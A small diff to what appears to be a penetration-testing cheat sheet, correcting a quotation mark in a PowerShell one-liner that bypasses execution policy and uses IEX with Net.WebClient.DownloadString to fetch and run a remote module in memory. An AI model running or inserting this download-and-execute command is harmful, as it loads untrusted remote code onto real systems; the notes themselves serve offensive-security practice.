@@ -10,7 +10,7 @@
 # PowerShell
 ## To load a PS module into the memory
 ```powershell
-powershell.exe -exec bypass -Command “IEX (New-Object Net.WebClient).DownloadString($URL);
+powershell.exe -exec bypass -Command “IEX (New-Object Net.WebClient).DownloadString($URL);"
 # Here call the modules you want to execute, depending on the usage of what you have downloaded
 ```
 # Utils
